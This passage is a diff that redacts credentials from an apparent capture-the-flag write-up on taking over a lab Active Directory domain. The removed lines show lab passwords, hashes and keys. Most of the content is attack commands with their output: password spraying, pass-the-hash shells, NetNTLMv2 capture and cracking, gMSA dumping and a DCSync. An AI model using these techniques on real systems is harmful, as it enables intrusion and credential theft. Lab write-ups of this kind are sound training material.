-DARKHAVEN\CA$:plain_password_hex:3700640047006d00480047006e003300640064004400790047003700490062006c004f006f0071004e0068004700680074003d004e006b00500030002b0059006a0037006e0056006100500054006200690078007a003000590054007200720069004800680070005900700039004a0065007a00660073004e0039006800560067004200730064003100450064004f00760048005a0037006b005900590075006e00500048003100300079004100760049004400360071006400610031005a00610079006c00440035003d0071006800520064006a00410074004f004c00700056006b003700350034003500590038003100300038006800350051005100610048006f004800450076005500730033003100320041004e00610055006300540034004b004b0062006a0078004800780056005500720041004100300036006b007300490077006500490077005600380059006800390051006200570043005a005500360044006f00630038006d006c0035007a0055004e00730065003100310046006700460046003d00670045004b004e007a00320043006b00340063006d0056007800300057006f00550065004900300043006a0042006a00560076003400490053006f004d006600630042007800750057005600760053006d00580068003d0045004a00500051002b0071006800730046007900340070006b0049007200
-DARKHAVEN\CA$:aad3b435b51404eeaad3b435b51404ee:4adb2fcb19b1cddc13e6202e216e77e1:::
+DARKHAVEN\CA$:plain_password_hex:<redacted>
+DARKHAVEN\CA$:<redacted>:<redacted>:::
 [*] DPAPI_SYSTEM
-dpapi_machinekey:0xa5dc745fe021c5036ee39bd27ef17b6b25aa2389
-dpapi_userkey:0xe198802366a87593465c879cdde6068d079cffc8
+dpapi_machinekey:<redacted>
+dpapi_userkey:<redacted>
 [*] NL$KM
-NL$KM:d6f91ebe2095216a88221f5c92ce2c8abbcf2c385953a43aefa003daeaa5a8cf0e6f9192023e5b4540e2c7a8d5da8b116d776b5f3f7848120fbfa8ce06c2c67c
+NL$KM:<redacted>
 [*] Cleaning up...
 [*] Stopping service RemoteRegistry
 ```
 
-> **Teaching Moment — Finding the Needle with a Big Spray:** Spraying `Welcome1@DarkH4ven` at every authenticated user in the domain is noisy, but the onboarding doc told us it is the *documented* default — meaning every user who has not yet logged in for the first time still holds it. `ichambers` was one such account, and because it was also a local admin on `CA`, one low-value observation (a generic default password) chained into a full local administrator compromise of a critical host.
+> **Teaching Moment — Finding the Needle with a Big Spray:** Spraying `<redacted>` at every authenticated user in the domain is noisy, but the onboarding doc told us it is the *documented* default — meaning every user who has not yet logged in for the first time still holds it. `ichambers` was one such account, and because it was also a local admin on `CA`, one low-value observation (a generic default password) chained into a full local administrator compromise of a critical host.
 
 ## ca.ext.darkhaven.local
 
 We can capture the `root.txt` on `ca.ext.darkhaven.local`:
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 evil-winrm -i 10.10.10.134 -u 'Administrator' -H '7af69f428fd21312a225c74e5f574ed6'
+Exegol ➜ /workspace/killshot 𝘹 evil-winrm -i 10.10.10.134 -u 'Administrator' -H '<redacted>'
 
 Evil-WinRM shell v3.9
 
@@ -1181,46 +1181,46 @@ Last rotation: January 14, 2025.
   fw-ext-01 and fw-ext-02
   URL       : https://10.10.10.254
   Username  : fwadmin
-  Password  : PAN_F!r3w@ll2024#ext
-  API Key   : LUFRPT1BYTVpWmVwR3pXdWVQYnVRPT0= (expires 2025-06-30)
+  Password  : <redacted>
+  API Key   : <redacted> (expires 2025-06-30)
 
 -- CORE SWITCHES --
   sw-core-01 and sw-core-02  (SSH port 22)
   Username  : netadmin
-  Password  : C!sc0_C0r3$witch24
-  Enable    : En@bl3_C0r3!2024
+  Password  : <redacted>
+  Enable    : <redacted>
 
 -- ACCESS SWITCHES (all units) --
   Username  : switchadmin
-  Password  : Acc3ss$W1tch_24!
-  Enable    : En@bl3Acc3ss!
+  Password  : <redacted>
+  Enable    : <redacted>
 
 -- NETWORK MONITORING (PRTG) --
   URL       : https://10.10.20.100:8443
   Username  : prtgadmin
-  Password  : PRTG_M0n!t0r@2024
+  Password  : <redacted>
 
 -- OUT-OF-BAND MANAGEMENT (OOBM) --
   URL       : https://10.10.10.240:8443
   Username  : oobm_admin
-  Password  : 00BM_K0ns0le#2024
+  Password  : <redacted>
 
 -- VPN GATEWAY --
   URL       : https://vpn.ext.darkhaven.local
   Username  : vpnadmin
-  Password  : VPN_G@t3way$2024!
+  Password  : <redacted>
 
 -- WIRELESS CONTROLLERS --
   URL           : https://10.10.20.200
   Username      : wifiadmin
-  Password      : W1F!_C0ntr0ll3r#24
-  Corp SSID PSK : DH_C0rp_W!F!_2024
-  Guest SSID PSK: DH_Gu3st_2024!
+  Password      : <redacted>
+  Corp SSID PSK : <redacted>
+  Guest SSID PSK: <redacted>
 
 -- NETWORK PROVISIONING SERVICE ACCOUNT --
   Host      : share.ext.darkhaven.local (10.10.10.135)
   Username  : svc_netops
-  Password  : N3t0ps$Svc_2024!
+  Password  : <redacted>
   Role      : Local Administrator on share server
   Purpose   : Automated network configuration backup scripts
               Runs nightly at 02:00 to pull switch/FW configs via TFTP
@@ -1229,12 +1229,12 @@ Last rotation: January 14, 2025.
 We can access the share with `svc_netops`:
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u 'svc_netops' -p 'N3t0ps$Svc_2024!' --local-auth
+Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u 'svc_netops' -p '<redacted>' --local-auth
 SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:None)
 SMB         10.10.10.135    445    SHARE            [*] Windows 11 / Server 2025 Build 26100 x64 (name:SHARE) (domain:SHARE) (signing:False) (SMBv1:None)
 SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:CA) (signing:False) (SMBv1:None)
 SMB         10.10.10.136    445    DC               [-] Connection Error: The NETBIOS connection with the remote host timed out.
-SMB         10.10.10.135    445    SHARE            [+] SHARE\svc_netops:N3t0ps$Svc_2024!
+SMB         10.10.10.135    445    SHARE            [+] SHARE\svc_netops:<redacted>
 SMB         10.10.10.134    445    CA               [-] Connection Error: The NETBIOS connection with the remote host timed out.
 SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:EC2AMAZ-IKFPL26) (signing:False) (SMBv1:None)
 SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [-] Connection Error: The NETBIOS connection with the remote host timed out.
@@ -1243,9 +1243,9 @@ SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [-] Connection Error: The NE
 RDP is open:
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc rdp 10.10.10.135 -u 'svc_netops' -p 'N3t0ps$Svc_2024!' --local-auth
+Exegol ➜ /workspace/killshot 𝘹 nxc rdp 10.10.10.135 -u 'svc_netops' -p '<redacted>' --local-auth
 RDP         10.10.10.135    3389   SHARE            [*] Windows 10 or Windows Server 2016 Build 26100 (name:SHARE) (domain:SHARE) (nla:True)
-RDP         10.10.10.135    3389   SHARE            [+] SHARE\svc_netops:N3t0ps$Svc_2024! (admin)
+RDP         10.10.10.135    3389   SHARE            [+] SHARE\svc_netops:<redacted> (admin)
 ```
 
 ![SHARE RDP as svc_netops](/assets/images/ctf/darkhaven/share-rdp-netops.png)
@@ -1461,11 +1461,11 @@ nt authority\system
 
 [*] Successfully executed hashdump
 [*] Got output:
-Administrator:500:Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
-Guest:501:Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
-DefaultAccount:503:DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
-WDAGUtilityAccount:504:WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
-svc_netops:1000:svc_netops:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
+Administrator:500:Administrator:500:<redacted>:<redacted>:::::
+Guest:501:Guest:501:<redacted>:<redacted>:::::
+DefaultAccount:503:DefaultAccount:503:<redacted>:<redacted>:::::
+WDAGUtilityAccount:504:WDAGUtilityAccount:504:<redacted>:<redacted>:::::
+svc_netops:1000:svc_netops:1000:<redacted>:<redacted>:::::
 ```
 
 ## Seatbelt — LogonEvents
@@ -1597,7 +1597,7 @@ At C:\Inveigh.ps1:6365 char:20
 ```zsh
 PS C:\> Get-Inveigh -NTLMv2
 Get-Inveigh -NTLMv2
-svc_webpool::EC2AMAZ-IKFPL26:44AFE4B12A655C92:B347B97742BBF85A2927A8A03916D0D1:01010000000000002FE15479CCC3DC019C12E157B6A8EB2000000000020012004400410052004B0048004100560045004E0001000A0053004800410052004500040026006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C0003003200730068006100720065002E006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C00050026006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C00070008002FE15479CCC3DC01060004000200000008003000300000000000000000000000003000007C9B6A33D2490344C611187BCD39A6A69064FB78E8A21801557831E817B22CBE0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310030002E003100330035000000000000000000
+svc_webpool::EC2AMAZ-IKFPL26:<redacted>
 ```
 
 ## Hashcat — Crack NetNTLMv2
@@ -1671,7 +1671,7 @@ For tips on supplying more work, see: https://hashcat.net/faq/morework
 
 Approaching final keyspace - workload adjusted.
 
-SVC_WEBPOOL::EC2AMAZ-IKFPL26:44afe4b12a655c92:b347b97742bbf85a2927a8a03916d0d1:01010000000000002fe15479ccc3dc019c12e157b6a8eb2000000000020012004400410052004b0048004100560045004e0001000a0053004800410052004500040026006500780074002e006400610072006b0068006100760065006e002e006c006f00630061006c0003003200730068006100720065002e006500780074002e006400610072006b0068006100760065006e002e006c006f00630061006c00050026006500780074002e006400610072006b0068006100760065006e002e006c006f00630061006c00070008002fe15479ccc3dc01060004000200000008003000300000000000000000000000003000007c9b6a33d2490344c611187bcd39a6a69064fb78e8a21801557831e817b22cbe0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310030002e003100330035000000000000000000:D@rkH@v3n128!
+SVC_WEBPOOL::EC2AMAZ-IKFPL26:<redacted>:<redacted>
 
 Session..........: hashcat
 Status...........: Cracked
@@ -1693,7 +1693,7 @@ Candidates.#1....: Darkhaven Technologies - IT Security Assessment Wordlist -> t
 Hardware.Mon.#1..: Temp: 54c Util: 10% Core:2190MHz Mem:8001MHz Bus:8
 ```
 
-> **Teaching Moment — Custom Wordlists Beat RockYou:** RockYou fails against environment-specific passwords like `D@rkH@v3n128!`. The IT team's own `it_security_wordlist.txt` dropped on the share is a gift — it was curated from *their* prior audits, so it captures their naming conventions. Always check the target for a pre-generated wordlist before grinding the hash against generic lists.
+> **Teaching Moment — Custom Wordlists Beat RockYou:** RockYou fails against environment-specific passwords like `<redacted>`. The IT team's own `it_security_wordlist.txt` dropped on the share is a gift — it was curated from *their* prior audits, so it captures their naming conventions. Always check the target for a pre-generated wordlist before grinding the hash against generic lists.
 
 We now have access to `.132`.
 
@@ -1704,7 +1704,7 @@ We now have access to `.132`.
 ## web.ext.darkhaven.local
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u 'svc_webpool' -p 'D@rkH@v3n128!' --local-auth
+Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u 'svc_webpool' -p '<redacted>' --local-auth
 SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:None)
 SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:CA) (signing:False) (SMBv1:None)
 SMB         10.10.10.135    445    SHARE            [*] Windows 11 / Server 2025 Build 26100 x64 (name:SHARE) (domain:SHARE) (signing:False) (SMBv1:None)
@@ -1713,11 +1713,11 @@ SMB         10.10.10.134    445    CA               [-] Connection Error: The NE
 SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:EC2AMAZ-IKFPL26) (signing:False) (SMBv1:None)
 SMB         10.10.10.135    445    SHARE            [-] Connection Error: The NETBIOS connection with the remote host timed out.
 SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [-] Error checking if user is admin on 10.10.10.132: The NETBIOS connection with the remote host timed out.
-SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\svc_webpool:D@rkH@v3n128!
+SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\svc_webpool:<redacted>
 ```
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 evil-winrm -i 10.10.10.132 -u 'svc_webpool' -p 'D@rkH@v3n128!'
+Exegol ➜ /workspace/killshot 𝘹 evil-winrm -i 10.10.10.132 -u 'svc_webpool' -p '<redacted>'
 
 Evil-WinRM shell v3.9
 
@@ -1871,11 +1871,11 @@ drwxrwxrwx  .                                   <dir>     Sat Mar 14 16:07:30 +0
 We can also use NXC to identify the credentials:
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.132 -u 'administrator' -p 'password123' --local-auth -M notepad++
+Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.132 -u 'administrator' -p '<redacted>' --local-auth -M notepad++
 /root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!
   warnings.warn(
 SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:EC2AMAZ-IKFPL26) (signing:False) (SMBv1:None)
-SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\administrator:password123 (admin)
+SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\administrator:<redacted> (admin)
 NOTEPAD++   10.10.10.132    445    EC2AMAZ-IKFPL26  C:\Users\Administrator\AppData\Roaming\Notepad++\backup\maint_config.php@2025-01-09_083047
 NOTEPAD++   10.10.10.132    445    EC2AMAZ-IKFPL26      <?php
 NOTEPAD++   10.10.10.132    445    EC2AMAZ-IKFPL26      /**
@@ -1907,7 +1907,7 @@ NOTEPAD++   10.10.10.132    445    EC2AMAZ-IKFPL26
 NOTEPAD++   10.10.10.132    445    EC2AMAZ-IKFPL26      // service account used to authenticate against the ca web enrollment interface
 NOTEPAD++   10.10.10.132    445    EC2AMAZ-IKFPL26      // todo: move this to environment variable before next audit - kwarren 2025-01-09
 NOTEPAD++   10.10.10.132    445    EC2AMAZ-IKFPL26      define('ca_auth_user',  'darkhaven\\kwarren');
-NOTEPAD++   10.10.10.132    445    EC2AMAZ-IKFPL26      define('ca_auth_pass',  '!@#darkhav3n123#@!');
+NOTEPAD++   10.10.10.132    445    EC2AMAZ-IKFPL26      define('ca_auth_pass',  '<redacted>');
 ```
 
 ```zsh
@@ -1925,19 +1925,19 @@ define('DOMAIN_SHORT',  'DARKHAVEN');
 // Service account used to authenticate against the CA web enrollment interface
 // TODO: move this to environment variable before next audit - kwarren 2025-01-09
 define('CA_AUTH_USER',  'DARKHAVEN\\kwarren');
-define('CA_AUTH_PASS',  '!@#darkhav3n123#@!')
+define('CA_AUTH_PASS',  '<redacted>')
 ```
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u 'kwarren' -p '!@#darkhav3n123#@!'
+Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u 'kwarren' -p '<redacted>'
 SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\kwarren:!@#darkhav3n123#@!
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\kwarren:<redacted>
 SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
 SMB         10.10.10.135    445    SHARE            [*] Windows 11 / Server 2025 Build 26100 x64 (name:SHARE) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
-SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (admin)
-SMB         10.10.10.135    445    SHARE            [+] ext.darkhaven.local\kwarren:!@#darkhav3n123#@!
+SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:<redacted> (admin)
+SMB         10.10.10.135    445    SHARE            [+] ext.darkhaven.local\kwarren:<redacted>
 SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
-SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] ext.darkhaven.local\kwarren:!@#darkhav3n123#@!
+SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] ext.darkhaven.local\kwarren:<redacted>
 Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 ```
 
@@ -1948,7 +1948,7 @@ Running nxc against 5 targets ━━━━━━━━━━━━━━━━�
 ## dc.ext.darkhaven.local
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 evil-winrm -i 10.10.10.136 -u 'kwarren' -p '!@#darkhav3n123#@!'
+Exegol ➜ /workspace/killshot 𝘹 evil-winrm -i 10.10.10.136 -u 'kwarren' -p '<redacted>'
 
 Evil-WinRM shell v3.9
 
@@ -1961,7 +1961,7 @@ The WinRM session kept typing so let's run RustHound.
 ## RustHound-CE
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 rusthound-ce -d ext.darkhaven.local -u ichambers -p 'Welcome1@DarkH4ven' -f DC.ext.darkhaven.local -k -z
+Exegol ➜ /workspace/killshot 𝘹 rusthound-ce -d ext.darkhaven.local -u ichambers -p '<redacted>' -f DC.ext.darkhaven.local -k -z
 ---------------------------------------------------
 Initializing RustHound-CE at 09:49:43 on 04/17/26
 Powered by @g0h4n_0
@@ -2015,11 +2015,11 @@ RustHound-CE Enumeration Completed at 09:49:47 on 04/17/26! Happy Graphing!
 Using NXC we can dump the `ca_svc_account`:
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc ldap 10.10.10.136 -u 'kwarren' -p '!@#darkhav3n123#@!' --gmsa
+Exegol ➜ /workspace/killshot 𝘹 nxc ldap 10.10.10.136 -u 'kwarren' -p '<redacted>' --gmsa
 LDAP        10.10.10.136    389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:ext.darkhaven.local) (signing:Enforced) (channel binding:No TLS cert)
-LDAP        10.10.10.136    389    DC               [+] ext.darkhaven.local\kwarren:!@#darkhav3n123#@!
+LDAP        10.10.10.136    389    DC               [+] ext.darkhaven.local\kwarren:<redacted>
 LDAP        10.10.10.136    389    DC               [*] Getting GMSA Passwords
-LDAP        10.10.10.136    389    DC               Account: ca_svc_account$      NTLM: 3ab7add8db852831e7299c61ba35e2d2     PrincipalsAllowedToReadPassword: GRP-gMSA-ca_svc_account-Readers
+LDAP        10.10.10.136    389    DC               Account: ca_svc_account$      NTLM: <redacted>     PrincipalsAllowedToReadPassword: GRP-gMSA-ca_svc_account-Readers
 ```
 
 `ca_svc_account` has the ability to Enroll with the DC:
@@ -2029,33 +2029,33 @@ LDAP        10.10.10.136    389    DC               Account: ca_svc_account$    
 I could not get anything to work with targeting Enroll, but further enumeration shows that we own `ca.ext.darkhaven.local`:
 
 ```
-Exegol ➜ /workspace/killshot 𝘹 nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H 3ab7add8db852831e7299c61ba35e2d2
+Exegol ➜ /workspace/killshot 𝘹 nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H <redacted>
 SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
-SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (admin)
+SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:<redacted> (admin)
 ```
 
 We have already compromised this machine, perhaps `ichambers` was unintended? Further enumeration with the accounts I could have bypassed a few steps, but I did take a couple weeks break on this lab. So things could be foggy. However, we can enumerate PowerShell history to identify:
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u 'ca_svc_account$' -H 3ab7add8db852831e7299c61ba35e2d2 -M powershell_history -o export=True
+Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u 'ca_svc_account$' -H <redacted> -M powershell_history -o export=True
 /root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!
   warnings.warn(
 SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
-SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2
+SMB         10.10.10.136    445    DC               [+] ext.darkhaven.local\ca_svc_account$:<redacted>
 SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
 SMB         10.10.10.135    445    SHARE            [*] Windows 11 / Server 2025 Build 26100 x64 (name:SHARE) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
-SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (admin)
-SMB         10.10.10.135    445    SHARE            [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2
+SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:<redacted> (admin)
+SMB         10.10.10.135    445    SHARE            [+] ext.darkhaven.local\ca_svc_account$:<redacted>
 POWERSHE... 10.10.10.134    445    CA               C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 POWERSHE... 10.10.10.134    445    CA                   $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
 POWERSHE... 10.10.10.134    445    CA                   $localLog = "C:\Temp\network_health_$timestamp.txt"
 POWERSHE... 10.10.10.134    445    CA                   $ping = Test-Connection -ComputerName $device.IP -Count 2 -Quiet`
 POWERSHE... 10.10.10.134    445    CA                   $tcp22 = Test-NetConnection -ComputerName $device.IP -Port 22 -InformationLevel Quiet`
 POWERSHE... 10.10.10.134    445    CA                   Write-Host "Health check complete. Preparing to upload log..."
-POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /user:ldap_svc 6trfgvb**hs#@jskKFHJAh34
+POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /user:ldap_svc <redacted>
 POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /delete
 POWERSHE... 10.10.10.134    445    CA                   echo "" > C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-POWERSHE... 10.10.10.134    445    CA                   net user "ca_svc_account$" "RTGHs82358sUFU*$%*&#jskj"
+POWERSHE... 10.10.10.134    445    CA                   net user "ca_svc_account$" "<redacted>"
 POWERSHE... 10.10.10.134    445    CA               PowerShell history written to: /root/.nxc/modules/powershell_history/10.10.10.134_Administrator_powershell_history.txt
 POWERSHE... 10.10.10.134    445    CA               C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 POWERSHE... 10.10.10.134    445    CA
@@ -2063,24 +2063,24 @@ POWERSHE... 10.10.10.134    445    CA
 POWERSHE... 10.10.10.134    445    CA
 POWERSHE... 10.10.10.134    445    CA               PowerShell history written to: /root/.nxc/modules/powershell_history/10.10.10.134_Administrator.DARKHAVEN_powershell_history.txt
 SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
-SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2
+SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] ext.darkhaven.local\ca_svc_account$:<redacted>
 Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 Exegol ➜ /workspace/killshot 𝘹
-Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u 'ca_svc_account$' -H 3ab7add8db852831e7299c61ba35e2d2 -M powershell_history -o export=True
-Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.134 -u 'ichambers' -p 'Welcome1@DarkH4ven'  -M powershell_history -o export=True                                        /root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!
+Exegol ➜ /workspace/killshot 𝘹 nxc smb ips.txt -u 'ca_svc_account$' -H <redacted> -M powershell_history -o export=True
+Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.134 -u 'ichambers' -p '<redacted>'  -M powershell_history -o export=True                                        /root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!
   warnings.warn(
 SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
-SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ichambers:Welcome1@DarkH4ven (admin)
+SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ichambers:<redacted> (admin)
 POWERSHE... 10.10.10.134    445    CA               C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 POWERSHE... 10.10.10.134    445    CA                   $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
 POWERSHE... 10.10.10.134    445    CA                   $localLog = "C:\Temp\network_health_$timestamp.txt"
 POWERSHE... 10.10.10.134    445    CA                   $ping = Test-Connection -ComputerName $device.IP -Count 2 -Quiet`
 POWERSHE... 10.10.10.134    445    CA                   $tcp22 = Test-NetConnection -ComputerName $device.IP -Port 22 -InformationLevel Quiet`
 POWERSHE... 10.10.10.134    445    CA                   Write-Host "Health check complete. Preparing to upload log..."
-POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /user:ldap_svc 6trfgvb**hs#@jskKFHJAh34
+POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /user:ldap_svc <redacted>
 POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /delete
 POWERSHE... 10.10.10.134    445    CA                   echo "" > C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-POWERSHE... 10.10.10.134    445    CA                   net user "ca_svc_account$" "RTGHs82358sUFU*$%*&#jskj"
+POWERSHE... 10.10.10.134    445    CA                   net user "ca_svc_account$" "<redacted>"
 POWERSHE... 10.10.10.134    445    CA               PowerShell history written to: /root/.nxc/modules/powershell_history/10.10.10.134_Administrator_powershell_history.txt
 POWERSHE... 10.10.10.134    445    CA               C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 POWERSHE... 10.10.10.134    445    CA
@@ -2094,7 +2094,7 @@ POWERSHE... 10.10.10.134    445    CA               PowerShell history written t
 ## dc.ext.darkhaven.local — DCSync
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.136 -u ldap_svc -p '6trfgvb**hs#@jskKFHJAh34'
+Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.136 -u ldap_svc -p '<redacted>'
 SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
 SMB         10.10.10.136    445    DC               [-] Connection Error: The NETBIOS connection with the remote host timed out.
 ```
@@ -2102,7 +2102,7 @@ SMB         10.10.10.136    445    DC               [-] Connection Error: The NE
 We can request a TGT and then perform a secretsdump.
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 getTGT.py 'ext.darkhaven.local/ldap_svc:6trfgvb**hs#@jskKFHJAh34' -dc-ip 10.10.10.136
+Exegol ➜ /workspace/killshot 𝘹 getTGT.py 'ext.darkhaven.local/ldap_svc:<redacted>' -dc-ip 10.10.10.136
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Saving ticket in ldap_svc.ccache
@@ -2113,13 +2113,13 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:c093cbd6000fa289a92b412131a4cefa:::
